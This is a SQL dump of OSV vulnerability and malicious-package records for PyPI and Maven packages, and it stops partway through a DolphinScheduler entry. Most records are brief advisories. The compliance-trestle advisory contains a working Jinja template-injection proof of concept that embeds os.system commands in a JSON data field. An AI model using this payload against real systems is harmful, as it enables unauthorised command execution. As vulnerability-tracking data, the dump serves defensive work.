INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2025-223', 'OSV', 'vllm', 'pypi', '', 'vLLM is a high-throughput and memory-efficient inference and serving engine for LLMs. The outlines library is one of the backends used by vLLM to support structured output (a.k.a. guided decoding). Outlines provides an optional cache for its compiled grammars on the local filesystem. This cache has been on by default in vLLM. Outlines is also available by default through the OpenAI compatible API server. The affected code in vLLM is vllm/model_executor/guided_decoding/outlines_logits_processors.py, which unconditionally uses the cache from outlines. A malicious user can send a stream of very short decoding requests with unique schemas, resulting in an addition to the cache for each request. This can result in a Denial of Service if the filesystem runs out of space. Note that even if vLLM was configured to use a different backend by default, it is still possible to choose outlines on a per-request basis using the guided_decoding_backend key of the extra_body field of the request. This issue applies only to the V0 engine and is fixed in 0.8.0.', '["0.0.1", "0.1.0", "0.1.1", "0.1.2", "0.1.3", "0.1.4", "0.1.5", "0.1.6", "0.1.7", "0.2.0", "0.2.1", "0.2.1.post1", "0.2.2", "0.2.3", "0.2.4", "0.2.5", "0.2.6", "0.2.7", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "0.4.0", "0.4.0.post1", "0.4.1", "0.4.2", "0.4.3", "0.5.0", "0.5.0.post1", "0.5.1", "0.5.2", "0.5.3", "0.5.3.post1", "0.5.4", "0.5.5", "0.6.0", "0.6.1", "0.6.1.post1", "0.6.1.post2", "0.6.2", "0.6.3", "0.6.3.post1", "0.6.4", "0.6.4.post1", "0.6.5", "0.6.6", "0.6.6.post1", "0.7.0", "0.7.1", "0.7.2", "0.7.3"]'::jsonb, '0.0', '2025-03-19 16:15:31.977+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2023-1', 'OSV', 'adyen', 'pypi', '', 'Adyen has utility methods for validating notification HMAC signatures. The is_valid_hmac and is_valid_hmac_notification methods are vulnerable to a timing attack, you should compare the hash of the HMACs instead.', '["2.2.0", "2.3.0", "3.0.0", "3.1.0", "4.0.0", "5.0.0", "5.1.0", "6.0.0", "7.0.0"]'::jsonb, '0.0', '2023-01-24 00:00:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-191939', 'OSV', 'xx-ent-wiki-sm', 'pypi', 'Malicious code in xx-ent-wiki-sm (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (5ebf0745c51c955dbe898efb0f6b721f30dd75edc24b4ee234e8574cee3da9d3)
Installing the package or importing the module exfiltrates basic information about the host, and the package has no other purpose.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: GENERIC-standard-pypi-install-pentest


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - The package overrides the install command in setup.py to execute malicious code during installation.
', '["99.2.2", "99.1.2", "99.1.1", "99.0.0"]'::jsonb, '0.0', '2025-08-25 19:09:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-191794', 'OSV', 'mongland', 'pypi', 'Malicious code in mongland (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (a003c7277ab04d5aec30eaa72b0f28b25c7534e6b036c381142300b3ac0bde9f)
Importing the module starts an infostealer


---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: 2025-11-mescouilles


Reasons (based on the campaign):


 - infostealer


 - infostealer:kiwi


 - infostealer:cstealer


 - exfiltration-generic


 - exfiltration-browser-data


 - exfiltration-credentials


 - files-exfiltration


 - The package contains code to detect if it is running in a sandbox environment.
', '["0.0.1"]'::jsonb, '0.0', '2025-11-24 06:37:26+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-41740', 'OSV', 'reqeuest-new', 'pypi', 'Malicious code in reqeuest-new (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["4.22.6"]'::jsonb, '0.0', '2025-08-28 07:11:44+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-2535', 'OSV', 'ttam', 'pypi', 'Malicious code in ttam (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (2925c78ff71ef8aee744b1b6b4fa9b5cef3b6ae018447d29ba5e63fe43ad01c1)
Dependency confusion attempt. The user identifies themselves as a HackerOne user abusing the PyPI for the purpose of a bug bounty program. This package did not contain any exfiltration activity.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: GENERIC-hackerone-bugbounty


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - dependency-confusion
', '["0.0.1"]'::jsonb, '0.0', '2026-04-10 15:28:37+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2024-295', 'OSV', 'pyassimp', 'pypi', '', 'A heap-buffer-overflow vulnerability was discovered in the SkipSpacesAndLineEnd function in Assimp v5.4.3. This issue occurs when processing certain malformed MD5 model files, leading to an out-of-bounds read and potential application crash.', '["0.1", "3.3", "4.1.1", "4.1.2", "4.1.3", "4.1.4", "5.2.5"]'::jsonb, '0.0', '2024-11-21 14:15:18.303+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2022-43106', 'OSV', 'democritus-hypothesis', 'pypi', '', 'The d8s-dicts for python, as distributed on PyPI, included a potential code-execution backdoor inserted by a third party. The backdoor is the democritus-hypothesis package. The affected version is 0.1.0', '["2021.1.21", "2021.1.21b0"]'::jsonb, '0.0', '2022-09-19 16:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2019-166', 'OSV', 'coapthon3', 'pypi', '', 'The Serialize.deserialize() method in CoAPthon3 1.0 and 1.0.1 mishandles certain exceptions, leading to a denial of service in applications that use this library (e.g., the standard CoAP server, CoAP client, example collect CoAP server and client) when they receive crafted CoAP messages.', '["1.0.1", "1.0.2"]'::jsonb, '0.0', '2019-04-02 19:29:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-5572', 'OSV', 'pruebasdemalware', 'pypi', 'Malicious code in pruebasdemalware (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.5"]'::jsonb, '0.0', '2024-06-25 13:38:54+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2020-110', 'OSV', 'sopel-plugins-channelmgnt', 'pypi', '', 'In the Channelmgnt plug-in for Sopel (a Python IRC bot) before version 1.0.3, malicious users are able to op/voice and take over a channel. This is an ACL bypass vulnerability. This plugin is bundled with MirahezeBot-Plugins with versions from 9.0.0 and less than 9.0.2 affected. Version 9.0.2 includes 1.0.3 of channelmgnt, and thus is safe from this vulnerability. See referenced GHSA-23pc-4339-95vg.', '["1.0.0", "1.0.1", "1.0.2"]'::jsonb, '0.0', '2020-10-13 18:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2014-54', 'OSV', 'plone', 'pypi', '', 'Multiple cross-site scripting (XSS) vulnerabilities in (1) spamProtect.py, (2) pts.py, and (3) request.py in Plone 2.1 through 4.1, 4.2.x through 4.2.5, and 4.3.x through 4.3.1 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors.', '["3.2", "3.2.1", "3.2.2", "3.2.3", "3.2a1", "3.2rc1", "3.3", "3.3.1", "3.3.2", "3.3.3", "3.3.4", "3.3.5", "3.3.6", "3.3b1", "3.3rc1", "3.3rc2", "3.3rc3", "3.3rc4", "3.3rc5", "4.0", "4.0.1", "4.0.10", "4.0.2", "4.0.3", "4.0.4", "4.0.5", "4.0.6", "4.0.7", "4.0.8", "4.0.9", "4.0a1", "4.0a2", "4.0a3", "4.0a4", "4.0a5", "4.0b1", "4.0b2", "4.0b3", "4.0b4", "4.0b5", "4.0rc1", "4.1", "4.1a1", "4.1a2", "4.1a3", "4.1b1", "4.1b2", "4.1rc2", "4.1rc3", "4.2", "4.2.1", "4.2.2", "4.2.3", "4.2.4", "4.2.5", "4.3", "4.3.1"]'::jsonb, '0.0', '2014-03-11 19:37:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-9995', 'OSV', 'etheriuim', 'pypi', 'Malicious code in etheriuim (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (4f1e93899ee0ae5c30987115c7b4940674868ff9f710e1eb0e6ec49c44ad83a7)
---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: funcaptcha-ru


Reasons (based on the campaign):


 - infostealer
', '["1.0.0"]'::jsonb, '0.0', '2024-06-28 20:16:20+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-gg2g-p7xc-qqmm', 'OSV', 'compliance-trestle', 'pypi', 'compliance-trestle Vulnerable to Remote Code Execution via Recursive Server-Side Template Injection (SSTI)', 'A High severity Server-Side Template Injection (SSTI) vulnerability exists in the `trestle author jinja` command. The command recursively evaluates rendered templates, allowing an attacker to achieve arbitrary command execution with privileges of the running process by injecting malicious payloads into data fields (such as SSP documents or Lookup Tables).

**The vulnerability does not require attacker control of the template itself. Only attacker-controlled input data rendered into a trusted template is required.** 

This distinction is critical: the template author may only intend to render plain text (e.g., `Title: {{ ssp.metadata.title }}`), but because of the recursive parsing, the data field itself becomes executable. 

The vulnerability is caused by recursive re-compilation and re-rendering of already-rendered output.

## Details
In `trestle/core/commands/author/jinja.py`, the `render_template` method performs recursive template evaluation to allow nesting within expressions:

```python
    @staticmethod
    def render_template(template: Template, lut: Dict[str, Any], template_folder: pathlib.Path) -> str:
        new_output = template.render(**lut)
        output = ''''
        error_countdown = JinjaCmd.max_recursion_depth
        while new_output != output and error_countdown > 0:
            error_countdown = error_countdown - 1
            output = new_output
            random_name = uuid.uuid4()
            dict_loader = DictLoader({str(random_name): new_output})
            # jinja_env does not use SandboxedEnvironment
            jinja_env = Environment(
                loader=ChoiceLoader([dict_loader, FileSystemLoader(template_folder)]),
                extensions=extensions(),
                autoescape=True,
                trim_blocks=True
            )
            template = jinja_env.get_template(str(random_name))
            new_output = template.render(**lut)
        return output
```

When a fully trusted and static template resolves a variable from an attacker-controlled data source, the attacker''s string is injected into the output. During the next pass of the `while` loop, this output is loaded into a new `Environment` via `DictLoader` and rendered again. Because `jinja_env` does not use `SandboxedEnvironment`, attacker-controlled template expressions embedded in data fields are re-evaluated as executable Jinja templates during recursive rendering.

## PoC (Proof of Concept)
The vulnerability survives even when the template itself is fully trusted and static. 
Tested on `Jinja2` version `3.1.6`.

1. Create a fully trusted template (`template.j2`) that simply renders a data variable from an external SSP model:
```jinja2
Title: {{ ssp.metadata.title }}
```

2. Generate a malicious OSCAL SSP document (`system-security-plans/malicious_ssp/system-security-plan.json`) where the title field contains a Jinja execution payload. This demonstrates how data becomes code execution:
```json
{
  "system-security-plan": {
    "uuid": "208dbe11-e6e2-411a-af18-095cd17a6a70",
    "metadata": {
      "title": "{{ namespace.__init__.__globals__.os.system(''touch poc.txt'') }}",
      "last-modified": "2024-01-01T00:00:00+00:00",
      "version": "1.0",
      "oscal-version": "1.0.4"
    },
    "import-profile": { "href": "trestle://profiles/test_profile/profile.json" }
  }
}
```

3. Execute the `trestle author jinja` command against the malicious data:
```bash
trestle author jinja -i template.j2 -o out.md -ssp malicious_ssp
```
*(Note: A similar payload injected via the `-lut` yaml argument yields identical results.)*

4. Verify arbitrary command execution:
```bash
ls poc.txt
# The file poc.txt is successfully created on the filesystem.
```

An attacker can also execute arbitrary shell commands directly, e.g.:
```json
      "title": "{{ namespace.__init__.__globals__.os.system(''id'') }}",
```

## Impact
This vulnerability allows arbitrary command execution with the privileges of the running process. If `compliance-trestle` is used in an automated pipeline (such as CI/CD workflows generating documentation from third-party vendor-supplied SSPs), a malicious payload embedded in a data field (like a system title or description) will result in a compromised runner environment. The user/operator must process the attacker-controlled SSP or LUT, satisfying the user interaction metric.', '["4.0.0", "4.0.1", "4.0.2"]'::jsonb, '0.0', '2026-05-28 19:01:38+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-pg7h-5qx3-wjr3', 'OSV', 'torch', 'pypi', 'Pytorch use-after-free vulnerability', 'Pytorch before version v2.2.0 was discovered to contain a use-after-free vulnerability in torch/csrc/jit/mobile/interpreter.cpp.', '["1.0.0", "1.0.1", "1.1.0", "1.10.0", "1.10.1", "1.10.2", "1.11.0", "1.12.0", "1.12.1", "1.13.0", "1.13.1", "1.2.0", "1.3.0", "1.3.1", "1.4.0", "1.5.0", "1.5.1", "1.6.0", "1.7.0", "1.7.1", "1.8.0", "1.8.1", "1.9.0", "1.9.1", "2.0.0", "2.0.1", "2.1.0", "2.1.1", "2.1.2"]'::jsonb, '0.0', '2024-04-17 21:30:48+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-5885', 'OSV', 'request-plus', 'pypi', 'Malicious code in request-plus (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["2.31.0"]'::jsonb, '0.0', '2024-06-25 13:41:35+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6gp4-2f92-j2w5', 'OSV', 'org.jenkins-ci.plugins:email-ext', 'maven', 'Jenkins Email Extension Plugin missing permission check', 'Jenkins Email Extension Plugin 2.96 and earlier does not perform a permission check in a method implementing form validation.

This allows attackers with Overall/Read permission to check for the existence of files in the `email-templates/` directory in the Jenkins home directory on the controller file system.

This form validation method requires the appropriate permission in Email Extension Plugin 2.96.1.', '["2.11", "2.12", "2.13", "2.14", "2.14.1", "2.15", "2.16", "2.18", "2.19", "2.20", "2.21", "2.22", "2.24.1", "2.25", "2.27", "2.27.1", "2.28", "2.29", "2.30", "2.30.1", "2.30.2", "2.31", "2.32", "2.33", "2.34", "2.35", "2.35.1", "2.36", "2.37", "2.37.1", "2.37.2", "2.37.2.2", "2.38", "2.38.1", "2.38.2", "2.39", "2.39.3", "2.40", "2.40-beta", "2.40.1", "2.40.2", "2.40.3", "2.40.4", "2.40.5", "2.41", "2.41.2", "2.41.3", "2.42", "2.43", "2.44", "2.45", "2.46", "2.47", "2.50", "2.51", "2.52", "2.53", "2.54", "2.55", "2.56", "2.57", "2.57.1", "2.57.2", "2.58", "2.59", "2.60", "2.61", "2.62", "2.62.1", "2.63", "2.64", "2.65", "2.66", "2.68", "2.68.1", "2.68.2", "2.69", "2.69.1", "2.69.2", "2.71", "2.72", "2.73", "2.74", "2.75", "2.76", "2.77", "2.78", "2.79", "2.80", "2.81", "2.82", "2.83", "2.84", "2.85", "2.86", "2.87", "2.88", "2.89", "2.89.0.1", "2.89.0.2", "2.89.1", "2.90", "2.91", "2.92", "2.93", "2.93.1", "2.94", "2.95", "2.96"]'::jsonb, '0.0', '2023-05-16 18:30:16+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-wv99-wmpf-jrqr', 'OSV', 'com.liferay.portal:release.portal.bom', 'maven', 'Cross-site scripting in Liferay Portal', 'Cross-site scripting (XSS) vulnerability in the Web Content Display widget''s article selector in Liferay Liferay Portal 7.4.3.50, and Liferay DXP 7.4 update 50 allows remote attackers to inject arbitrary web script or HTML via a crafted payload injected into a web content article''s `Title` field.', '["7.4.3.50"]'::jsonb, '0.0', '2023-05-24 15:30:27+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6g3c-2mh5-7q6x', 'OSV', 'com.manydesigns:portofino-dispatcher', 'maven', 'Missing validation of JWT signature in `ManyDesigns/Portofino`', '### Impact
[Portofino](https://github.com/ManyDesigns/Portofino) is an open source web development framework. Portofino before version 5.2.1 did not properly verify the signature of JSON Web Tokens.
This allows forging a valid JWT.

### Patches
The issue will be patched in the upcoming 5.2.1 release.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [https://github.com/ManyDesigns/Portofino](https://github.com/ManyDesigns/Portofino)', '["5.0.0", "5.0.1", "5.0.2", "5.0.3", "5.1.0", "5.1.1", "5.1.2", "5.1.3", "5.1.4", "5.2.0"]'::jsonb, '0.0', '2021-04-19 14:56:33+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-gvmr-mp5q-9wvw', 'OSV', 'org.jenkins-ci.plugins:skype-notifier', 'maven', 'Plaintext Storage of a Password in Jenkins Skype notifier Plugin', 'Skype notifier Plugin 1.1.0 and earlier stores a password unencrypted in its global configuration file `hudson.plugins.skype.im.transport.SkypePublisher.xml` on the Jenkins controller as part of its configuration. This password can be viewed by users with access to the Jenkins controller file system.', '["1.0", "1.0.1", "1.1.0"]'::jsonb, '0.0', '2022-07-01 00:01:08+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-9jrh-hch8-rr5c', 'OSV', 'org.jenkins-ci.plugins:copy-to-slave', 'maven', 'Jenkins Copy To Slave Plugin allows access to arbitrary files on the Jenkins controller file system ', 'An exposure of sensitive information vulnerability exists in Jenkins Copy To Slave Plugin version 1.4.4 and older in CopyToSlaveBuildWrapper.java that allows attackers with permission to configure jobs to read arbitrary files from the Jenkins master file system.', '["1.4", "1.4.3", "1.4.4"]'::jsonb, '0.0', '2022-05-14 03:23:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-4mq5-mj59-qq9c', 'OSV', 'org.apache.tika:tika-parsers', 'maven', 'Allocation of Resources Without Limits or Throttling in Apache Tika', 'In Apache Tika 1.19 to 1.21, a carefully crafted 2003ml or 2006ml file could consume all available SAXParsers in the pool and lead to very long hangs. Apache Tika users should upgrade to 1.22 or later.', '["1.19", "1.19.1", "1.20", "1.21"]'::jsonb, '0.0', '2019-08-06 01:43:38+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-r2vw-x3hr-969v', 'OSV', 'org.jenkins-ci.plugins:azure-vm-agents', 'maven', 'Unprivileged users with Overall/Read access are able to enumerate credential IDs in Azure VM Agents Plugin', 'An information exposure vulnerability exists in Jenkins Azure VM Agents Plugin 0.8.0 and earlier in src/main/java/com/microsoft/azure/vmagent/AzureVMCloud.java that allows attackers with Overall/Read permission to enumerate credentials IDs of credentials stored in Jenkins.', '["0.4.0", "0.4.1", "0.4.2", "0.4.3", "0.4.4", "0.4.5", "0.4.5.1", "0.4.6", "0.4.7", "0.4.7.1", "0.4.8", "0.5.0", "0.6.0", "0.6.1", "0.6.2", "0.7.0", "0.7.1", "0.7.2", "0.7.2.1", "0.7.3", "0.7.4", "0.7.5", "0.8.0"]'::jsonb, '0.0', '2022-05-13 01:15:07+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6q78-6xvr-26fg', 'OSV', 'org.jenkins-ci.plugins.workflow:workflow-cps-parent', 'maven', 'Jenkins Groovy Plugin sandbox bypass vulnerability', 'Jenkins Script Security sandbox protection could be circumvented during the script compilation phase by applying AST transforming annotations such as `@Grab` to source code elements.

Both the pipeline validation REST APIs and actual script/pipeline execution are affected.

This allowed users with Overall/Read permission, or able to control Jenkinsfile or sandboxed Pipeline shared library contents in SCM, to bypass the sandbox protection and execute arbitrary code on the Jenkins controller.

All known unsafe AST transformations in Groovy are now prohibited in sandboxed scripts.', '["1.0", "1.0-beta-1", "1.0-beta-2", "1.0-beta-3", "1.0-beta-4", "1.0-beta-5", "1.0-beta-6", "1.1", "1.10", "1.11", "1.12", "1.13", "1.14", "1.15", "1.16", "1.17", "1.18", "1.18.1", "1.19", "1.2", "1.20", "1.21", "1.22", "1.23", "1.24", "1.25", "1.26", "1.27", "1.28", "1.29", "1.29.1", "1.3", "1.30", "1.31", "1.33", "1.34", "1.35", "1.36", "1.37", "1.38", "1.39", "1.4", "1.40", "1.41", "1.42", "1.43", "1.44", "1.44.1", "1.45", "1.46", "1.46.1", "1.47", "1.48", "1.49", "1.5", "1.6", "1.7", "1.8", "1.9"]'::jsonb, '0.0', '2022-05-13 01:15:20+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-hxqq-w4mr-mc62', 'OSV', 'org.apache.struts:struts2-core', 'maven', 'Apache Struts''s ParameterInterceptor component does not prevent access to public constructors', 'The ParameterInterceptor component in Apache Struts before 2.3.1.1 does not prevent access to public constructors, which allows remote attackers to create or overwrite arbitrary files via a crafted parameter that triggers the creation of a Java object.', '["2.2.1", "2.2.1.1", "2.2.3"]'::jsonb, '0.0', '2022-05-04 00:29:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-2259-h742-5vr4', 'OSV', 'org.jboss:jboss-ejb-client', 'maven', 'JBoss EJB Client information disclosure vulnerability', 'A flaw was found in wildfly. The JBoss EJB client has publicly accessible privileged actions which may lead to information disclosure on the server it is deployed on. The highest threat from this vulnerability is to data confidentiality.', '["1.0.0.Beta1", "1.0.0.Beta10", "1.0.0.Beta11", "1.0.0.Beta12", "1.0.0.Beta2", "1.0.0.Beta3", "1.0.0.Beta4", "1.0.0.Beta5", "1.0.0.Beta6", "1.0.0.Beta7", "1.0.0.Beta8", "1.0.0.Beta9", "1.0.0.Final", "1.0.1.Final", "1.0.10.Final", "1.0.11.Final", "1.0.12.Final", "1.0.13.Final", "1.0.14.Final", "1.0.15.Final", "1.0.16.Final", "1.0.17.Final", "1.0.18.Final", "1.0.19.Final", "1.0.2.Final", "1.0.20.Final", "1.0.21.Final", "1.0.22.Final", "1.0.23.Final", "1.0.24.Final", "1.0.25.Final", "1.0.26.Final", "1.0.27.Final", "1.0.28.Final", "1.0.29.Final", "1.0.3.Final", "1.0.30.Final", "1.0.31.Final", "1.0.32.Final", "1.0.33.Final", "1.0.34.Final", "1.0.35.Final", "1.0.36.Final", "1.0.37.Final", "1.0.38.Final", "1.0.39.Final", "1.0.4.Final", "1.0.40.Final", "1.0.41.Final", "1.0.5.Final", "1.0.6.CR1", "1.0.6.Final", "1.0.7.Final", "1.0.8.Final", "1.0.9.Final", "1.1.0.Alpha1", "2.0.0.Beta1", "2.0.0.Beta2", "2.0.0.Beta3", "2.0.0.Beta4", "2.0.0.Beta5", "2.0.0.Final", "2.0.1.Final", "2.0.2.Final", "2.0.3.Final", "2.1.0.Final", "2.1.1.Final", "2.1.2.Final", "2.1.3.Final", "2.1.4.Final", "2.1.5.Final", "2.1.6.Final", "2.1.7.Final", "2.1.8.Final", "3.0.0.Beta1", "3.0.0.Beta2", "3.0.0.Beta3", "3.0.0.Beta4", "3.0.0.Beta5", "4.0.0.Beta1", "4.0.0.Beta10", "4.0.0.Beta11", "4.0.0.Beta12", "4.0.0.Beta13", "4.0.0.Beta14", "4.0.0.Beta15", "4.0.0.Beta16", "4.0.0.Beta17", "4.0.0.Beta18", "4.0.0.Beta19", "4.0.0.Beta2", "4.0.0.Beta20", "4.0.0.Beta21", "4.0.0.Beta22", "4.0.0.Beta23", "4.0.0.Beta24", "4.0.0.Beta25", "4.0.0.Beta25-jbossorg-1", "4.0.0.Beta26", "4.0.0.Beta27", "4.0.0.Beta28", "4.0.0.Beta29", "4.0.0.Beta3", "4.0.0.Beta30", "4.0.0.Beta31", "4.0.0.Beta4", "4.0.0.Beta5", "4.0.0.Beta6", "4.0.0.Beta7", "4.0.0.Beta8", "4.0.0.Beta9", "4.0.0.CR1", "4.0.0.CR2", "4.0.0.CR3", "4.0.0.CR4", "4.0.0.CR5", "4.0.0.CR6", "4.0.0.CR7", "4.0.0.Final", "4.0.1.Final", "4.0.10.Final", "4.0.11.Final", "4.0.12.Final", "4.0.13.Final", "4.0.14.Final", "4.0.15.Final", "4.0.16.Final", "4.0.17.Final", "4.0.18.Final", "4.0.19.Final", "4.0.2.Final", "4.0.20.Final", "4.0.21.Final", "4.0.22.Final", "4.0.23.Final", "4.0.24.Final", "4.0.25.Final", "4.0.26.Final", "4.0.27.Final", "4.0.28.Final", "4.0.29.Final", "4.0.3.Final", "4.0.30.Final", "4.0.31.Final", "4.0.32.Final", "4.0.33.Final", "4.0.34.Final", "4.0.35.Final", "4.0.36.Final", "4.0.37.Final", "4.0.38.Final", "4.0.4.Final", "4.0.5.Final", "4.0.6.Final", "4.0.7.Final", "4.0.8.Final", "4.0.9.Final"]'::jsonb, '0.0', '2022-05-24 19:02:23+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-9wcx-326r-7j7w', 'OSV', 'org.apache.activemq:activemq-core', 'maven', 'Denial of Service in Apache ActiveMQ', 'Apache ActiveMQ before 5.6.0 allows remote attackers to cause a denial of service (file-descriptor exhaustion and broker crash or hang) by sending many openwire failover:tcp:// connection requests.', '["4.1.1", "4.1.2", "5.0.0", "5.1.0", "5.2.0", "5.3.0", "5.3.1", "5.3.2", "5.4.0", "5.4.1", "5.4.2", "5.4.3", "5.5.0", "5.5.1"]'::jsonb, '0.0', '2022-05-17 05:35:59+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6x9x-8qw9-9pp6', 'OSV', 'org.eclipse.jetty:jetty-server', 'maven', 'Jetty vulnerable to authorization bypass due to inconsistent HTTP request handling (HTTP Request Smuggling)', 'Eclipse Jetty Server versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), are vulnerable to HTTP Request Smuggling when presented with two content-lengths headers, allowing authorization bypass. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decides on the shorter length, but still passes on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary is imposing authorization, the fake pipelined request bypasses that authorization.', '["9.4.0.v20161208", "9.4.0.v20180619", "9.4.1.v20170120", "9.4.1.v20180619", "9.4.10.RC0", "9.4.10.RC1", "9.4.10.v20180503", "9.4.2.v20170220", "9.4.2.v20180619", "9.4.3.v20170317", "9.4.3.v20180619", "9.4.4.v20170414", "9.4.4.v20180619", "9.4.5.v20170502", "9.4.5.v20180619", "9.4.6.v20170531", "9.4.6.v20180619", "9.4.7.RC0", "9.4.7.v20170914", "9.4.7.v20180619", "9.4.8.v20171121", "9.4.8.v20180619", "9.4.9.v20180320"]'::jsonb, '0.0', '2018-10-19 16:16:38+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-55j7-f5wf-43m4', 'OSV', 'org.apache.cxf:cxf', 'maven', 'Remote web-service operation execution in Apache CXF', 'Apache CXF before 2.4.9, 2.5.x before 2.5.5, and 2.6.x before 2.6.2 allows remote attackers to execute unintended web-service operations by sending a header with a SOAP Action String that is inconsistent with the message body.', '["2.6.0", "2.6.1"]'::jsonb, '0.0', '2022-05-13 01:09:21+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-v7hg-77v9-2445', 'OSV', 'org.apache.dolphinscheduler:dolphinscheduler-master', 'maven', 'Apache DolphinScheduler: Arbitrary js execute as root for authenticated users', 'Improper Input Validation vulnerability in Apache DolphinScheduler. An authenticated user can cause arbitrary, unsandboxed javascript to be executed on the server.This issue affects Apache DolphinScheduler: until 3.1.9.

